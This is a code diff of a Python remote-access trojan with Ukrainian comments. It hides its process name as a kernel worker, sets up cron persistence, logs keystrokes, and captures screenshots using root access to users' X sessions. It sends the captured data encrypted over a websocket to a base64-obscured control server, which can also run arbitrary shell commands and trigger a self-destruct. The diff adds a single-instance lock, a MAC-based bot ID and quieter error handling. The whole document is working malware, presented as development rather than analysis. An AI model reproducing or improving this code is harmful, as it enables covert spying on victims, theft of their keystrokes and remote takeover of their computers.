@@ -8,6 +8,7 @@ import sys
 import shutil
 import glob
 import io
+import socket
 from io import BytesIO
 
 try: import setproctitle
@@ -23,13 +24,10 @@ X_KEY = "AMY_2026_SECRET"
 FAKE_NAME = "[kworker/u2:1-events]"
 
 log_buffer = []
-current_dir = os.getcwd()
 
 def get_url(): 
-    try:
-        return base64.b64decode(_S).decode()
-    except:
-        return ""
+    try: return base64.b64decode(_S).decode()
+    except: return ""
 
 def crypt_logic(d):
     k = X_KEY
@@ -54,6 +52,16 @@ def masquerade():
             libc.prctl(15, FAKE_NAME.encode(), 0, 0, 0)
         except: pass
 
+def is_already_running():
+    """Проста перевірка, щоб не запускати кілька копій"""
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        # Створюємо абстрактний сокет (тільки для Linux)
+        s.bind('\0amy_bot_lock')
+        return s
+    except socket.error:
+        return None
+
 def ghost_install():
     try:
         p = os.path.expanduser("~/.local/share/systemd-service")
@@ -62,50 +70,42 @@ def ghost_install():
         if not os.path.exists(t):
             shutil.copy2(sys.argv[0], t)
             os.chmod(t, 0o755)
-            c = f"*/2 * * * * {t} >/dev/null 2>&1"
-            subprocess.run(f'(crontab -l 2>/dev/null; echo "{c}") | crontab -', shell=True)
+            # Додаємо в cron тільки якщо там ще немає запису
+            check_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True)
+            if "sys-update" not in check_cron.stdout:
+                c = f"*/2 * * * * {t} >/dev/null 2>&1"
+                subprocess.run(f'(crontab -l 2>/dev/null; echo "{c}") | crontab -', shell=True)
     except: pass
 
 def take_screenshot_sync():
-    """Покращений метод захоплення екрана для Linux"""
-    if not ImageGrab:
-        return None
+    if not ImageGrab: return None
     try:
-        # Налаштування оточення для X11
-        if 'DISPLAY' not in os.environ:
-            os.environ['DISPLAY'] = ':0'
-        
-        # Вирішення проблеми з доступом root до сесії користувача
+        if 'DISPLAY' not in os.environ: os.environ['DISPLAY'] = ':0'
         if os.getuid() == 0:
-            # Шукаємо .Xauthority у домашніх папках користувачів
             auth_paths = glob.glob('/home/*/.Xauthority') + ['/root/.Xauthority']
             for path in auth_paths:
                 if os.path.exists(path):
                     os.environ['XAUTHORITY'] = path
                     break
-
-        # Спроба зробити знімок
-        # Важливо: у системі МАЄ бути встановлений scrot (apt install scrot)
+        
         screenshot = ImageGrab.grab()
-        if screenshot:
-            buf = io.BytesIO()
-            screenshot.save(buf, format="PNG")
-            return base64.b64encode(buf.getvalue()).decode()
-    except Exception as e:
-        print(f"DEBUG Error: {e}") # Можна прибрати в продакшні
+        buf = io.BytesIO()
+        screenshot.save(buf, format="PNG")
+        return base64.b64encode(buf.getvalue()).decode()
+    except:
         return None
-    return None
 
 async def run_shell(cmd):
     try:
+        # Повертаємо чистий вивід без os.getlogin(), щоб не ламати виконання
         proc = await asyncio.create_subprocess_shell(
             cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
         )
         o, e = await proc.communicate()
         res = o.decode() + e.decode()
-        return f"{os.getlogin()}:{os.getcwd()}:$ {res}" if res else "Command executed (no output)."
+        return res if res else " "
     except Exception as ex:
-        return f"Error: {str(ex)}"
+        return str(ex)
 
 async def keylog_sender(ws):
     global log_buffer
@@ -113,8 +113,10 @@ async def keylog_sender(ws):
         await asyncio.sleep(20)
         if log_buffer:
             data = "".join(log_buffer)
-            await ws.send(encrypt(f"LOGS:{data}"))
-            log_buffer = []
+            try:
+                await ws.send(encrypt(f"LOGS:{data}"))
+                log_buffer = []
+            except: pass
 
 def on_press(key):
     try: log_buffer.append(key.char)
@@ -124,22 +126,26 @@ def on_press(key):
         else: log_buffer.append(f"[{key.name}]")
 
 async def start():
+    # Захист від дублікатів
+    lock_socket = is_already_running()
+    if not lock_socket:
+        sys.exit(0)
+
     masquerade()
     ghost_install()
     
     if keyboard:
-        listener = keyboard.Listener(on_press=on_press)
-        listener.start()
+        try:
+            listener = keyboard.Listener(on_press=on_press)
+            listener.start()
+        except: pass
 
-    b_id = str(uuid.uuid4())[:8]
+    # Статичний ID на основі MAC-адреси (перші 8 символів)
+    b_id = hex(uuid.getnode())[2:10]
     
     while True:
         try:
             url = get_url()
-            if not url: 
-                await asyncio.sleep(10)
-                continue
-                
             async with websockets.connect(url + b_id, ping_interval=None) as ws:
                 asyncio.create_task(keylog_sender(ws))
                 while True:
@@ -149,27 +155,20 @@ async def start():
                     cmd = cmd.strip()
                     
                     if cmd == "screenshot":
-                        # Використовуємо thread для запобігання блокуванню event loop
                         shot_b64 = await asyncio.to_thread(take_screenshot_sync)
                         if shot_b64:
                             await ws.send(encrypt(f"SCREENSHOT:{shot_b64}"))
                         else:
-                            # Додаткова діагностика для вас
-                            await ws.send(encrypt("SYS_MSG: Screenshot failed. Check if 'scrot' is installed."))
+                            await ws.send(encrypt("SYS_MSG: Screenshot failed"))
                             
-                    elif cmd == "steal":
-                        await ws.send(encrypt("SYS_MSG: Stealer initiated..."))
-                        # Логіка збору файлів може бути додана тут
-                        await ws.send(encrypt("SYS_MSG: Stealer finished (Placeholder)."))
-                        
                     elif cmd == "self_destruct":
                         subprocess.run("crontab -r", shell=True)
                         os._exit(0)
                     else:
                         response = await run_shell(cmd)
                         await ws.send(encrypt(response))
-        except Exception:
-            await asyncio.sleep(5)
+        except:
+            await asyncio.sleep(10)
 
 if __name__ == "__main__":
     asyncio.run(start())
